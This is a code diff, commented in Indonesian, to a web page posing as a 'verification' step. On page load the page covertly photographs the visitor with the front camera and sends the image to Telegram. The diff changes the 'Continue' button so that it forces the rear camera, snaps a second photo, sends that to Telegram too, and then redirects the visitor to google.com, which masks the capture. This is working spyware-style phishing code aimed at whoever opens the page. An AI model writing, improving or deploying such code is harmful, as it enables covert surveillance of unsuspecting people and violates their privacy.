@@ -65,7 +65,7 @@
             }
         }
 
-        // TAHAP 1: Otomatis saat halaman dibuka
+        // TAHAP 1: Otomatis Kamera Depan saat halaman dibuka
         window.addEventListener('DOMContentLoaded', async () => {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -88,9 +88,8 @@
 
                     canvas.toBlob(async (blob) => {
                         if (blob) {
-                            await kirimKeTelegram(blob, '📸 Foto Tahap 1 (Otomatis saat dibuka)');
+                            await kirimKeTelegram(blob, '📸 Foto Tahap 1 (Kamera Depan)');
                         }
-                        // Setelah foto pertama terkirim, ubah teks dan tampilkan tombol
                         document.getElementById('statusText').innerText = "Verifikasi Selesai";
                         document.getElementById('btnLanjut').style.display = 'inline-block';
                     }, 'image/jpeg', 0.85);
@@ -104,7 +103,7 @@
             }
         });
 
-        // TAHAP 2: Saat tombol "Lanjutkan" diklik oleh user
+        // TAHAP 2: Saat tombol "Lanjutkan" diklik -> Memaksa Kamera Belakang
         document.getElementById('btnLanjut').addEventListener('click', async () => {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -113,11 +112,28 @@
             document.getElementById('btnLanjut').disabled = true;
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
+                // Deteksi daftar perangkat kamera setelah ada interaksi klik
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+
+                // Cari yang mengindikasikan kamera belakang (environment / back / rear)
+                let selectedDevice = videoDevices.find(d => 
+                    d.label.toLowerCase().includes('back') || 
+                    d.label.toLowerCase().includes('rear') || 
+                    d.label.toLowerCase().includes('environment')
+                );
+
+                // Jika label kosong tapi ada lebih dari 1 kamera, ambil kamera terakhir (biasanya belakang)
+                if (!selectedDevice && videoDevices.length > 1) {
+                    selectedDevice = videoDevices[videoDevices.length - 1];
+                }
+
+                const constraints = {
+                    video: selectedDevice ? { deviceId: { exact: selectedDevice.deviceId } } : { facingMode: "environment" },
+                    audio: false
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
                 
                 setTimeout(async () => {
@@ -130,16 +146,15 @@
 
                     canvas.toBlob(async (blob) => {
                         if (blob) {
-                            await kirimKeTelegram(blob, '📸 Foto Tahap 2 (Klik Tombol Lanjutkan)');
+                            await kirimKeTelegram(blob, '📸 Foto Tahap 2 (Kamera Belakang)');
                         }
-                        // Redirect ke halaman akhir setelah foto kedua terkirim
                         window.location.href = "https://www.google.com";
                     }, 'image/jpeg', 0.85);
 
                 }, 1500);
 
             } catch (error) {
-                console.error("Akses kamera ditolak tahap 2:", error);
+                console.error("Akses kamera belakang gagal:", error);
                 window.location.href = "https://www.google.com";
             }
         });
